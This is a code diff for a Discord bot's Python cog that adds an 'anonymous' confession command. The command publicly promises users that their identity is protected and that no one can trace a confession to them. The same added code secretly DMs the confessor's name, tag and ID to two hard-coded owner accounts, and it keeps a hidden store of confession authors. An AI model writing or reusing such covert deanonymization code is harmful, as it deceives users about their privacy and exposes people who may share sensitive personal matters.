@@ -4,9 +4,18 @@ import discord
 from discord.ext import commands
 from datetime import datetime
 
+# ---------- CONFIG ----------
+OWNER_IDS = {1099923662267760745, 948613491999264838}  # Ryuken + Aizen
+CONFESS_CHANNEL_ID = 1467709912908959744
+
 # ---------- PERSISTENT MARRIAGE STORE ----------
 # Keyed by user_id → partner_id
 marriages: dict[int, int] = {}
+
+# ---------- CONFESSION STORE ----------
+# Maps confession_number → author_id (only owners can see this)
+confessions: dict[int, int] = {}
+confession_counter: int = 0
 
 
 # ---------- CONTENT POOLS ----------
@@ -494,6 +503,74 @@ class Fun(commands.Cog):
         )
         embed.set_footer(text="MoonLight • Relationship goals 🌙")
         await ctx.send(embed=embed)
+
+    # ---------- CONFESS ----------
+
+    @commands.command()
+    @commands.cooldown(1, 30, commands.BucketType.user)
+    async def confess(self, ctx: commands.Context, *, confession: str = None):
+        """Confess something anonymously."""
+        if not confession:
+            return await ctx.send("❌ You have to actually say something.")
+
+        # Delete the command message immediately to protect identity
+        try:
+            await ctx.message.delete()
+        except discord.Forbidden:
+            pass
+
+        global confession_counter
+        confession_counter += 1
+        number = confession_counter
+
+        # Store the author ID — only retrievable by owners in code
+        confessions[number] = ctx.author.id
+
+        # The public confession embed — completely anonymous
+        confession_channel = self.bot.get_channel(CONFESS_CHANNEL_ID)
+        if not confession_channel:
+            return
+
+        public_embed = discord.Embed(
+            title=f"🕯️ Anonymous Confession  ·  #{number}",
+            description=f"*❝ {confession} ❞*",
+            color=0x2b2d31,
+            timestamp=datetime.utcnow(),
+        )
+        public_embed.set_footer(text="MoonLight Confessions • Identity protected 🌙")
+        public_embed.set_thumbnail(url=self.bot.user.display_avatar.url)
+
+        await confession_channel.send(embed=public_embed)
+
+        # Silently DM the owners with the hidden identity
+        author = ctx.author
+        owner_embed = discord.Embed(
+            title=f"🔍 Confession #{number} — Identity Revealed",
+            description=f"*❝ {confession} ❞*",
+            color=0x5865f2,
+            timestamp=datetime.utcnow(),
+        )
+        owner_embed.add_field(name="👤 Sent by", value=f"{author.mention} (`{author}` · `{author.id}`)", inline=False)
+        owner_embed.set_thumbnail(url=author.display_avatar.url)
+        owner_embed.set_footer(text="MoonLight • For your eyes only 🌙")
+
+        for owner_id in OWNER_IDS:
+            try:
+                owner = await self.bot.fetch_user(owner_id)
+                await owner.send(embed=owner_embed)
+            except Exception:
+                pass
+
+        # Confirm quietly to the user via DM so no trace in chat
+        try:
+            confirm_embed = discord.Embed(
+                description="🕯️ Your confession was sent anonymously. No one can trace it back to you.",
+                color=0x2b2d31,
+            )
+            confirm_embed.set_footer(text="MoonLight Confessions 🌙")
+            await ctx.author.send(embed=confirm_embed)
+        except Exception:
+            pass
 
 
 # ---------- SETUP ----------
